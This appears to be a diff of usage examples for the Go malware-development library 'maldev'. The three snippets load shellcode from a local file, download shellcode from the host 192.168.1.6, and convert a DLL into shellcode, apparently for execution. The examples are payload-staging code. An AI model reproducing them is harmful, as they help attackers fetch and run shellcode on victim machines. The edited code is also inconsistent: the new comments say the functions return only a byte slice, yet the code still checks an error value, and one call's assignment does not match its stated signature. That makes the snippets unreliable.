@@ -52,14 +52,13 @@ func main(){
 package main
 
 import (
-  "fmt"
   "log"
 
   "github.com/D3Ext/maldev/shellcode"
 )
 
 func main(){
-  shellcode_to_exec, err := shellcode.GetShellcodeFromFile("./shellcode.bin") // func GetShellcodeFromFile(filename string) ([]byte, error) {}
+  shellcode_to_exec, err := shellcode.GetShellcodeFromFile("./shellcode.bin") // func GetShellcodeFromFile(filename string) []byte {}
   if err != nil {
     log.Fatal(err)
   }
@@ -73,14 +72,13 @@ func main(){
 package main
 
 import (
-  "fmt"
   "log"
 
   "github.com/D3Ext/maldev/shellcode"
 )
 
 func main(){
-  shellcode_to_exec, err := shellcode.GetShellcodeFromUrl("http://192.168.1.6/shellcode.bin") // func GetShellcodeFromUrl(url string) ([]byte, error) {}
+  shellcode_to_exec, err := shellcode.GetShellcodeFromUrl("http://192.168.1.6/shellcode.bin") // func GetShellcodeFromUrl(url string) []byte {}
   if err != nil {
     log.Fatal(err)
   }
@@ -96,19 +94,16 @@ func main(){
 package main
 
 import (
-  "fmt
   "log"
 
   "github.com/D3Ext/maldev/shellcode"
 )
 
 func main(){
-  sc, err := shellcode.ConvertDllToShellcode("example.dll", "functionName", "") // func ConvertDllToShellcode(dll_file string, function_name string, args string) ([]byte, error) {}
+  err := shellcode.ConvertDllToShellcode("example.dll", "functionName", "") // func ConvertDllToShellcode(dll_file string, function_name string, args string) ([]byte, error) {}
   if err != nil {
     log.Fatal(err)
   }
-  
-  fmt.Println(sc)
 }
 ```
 
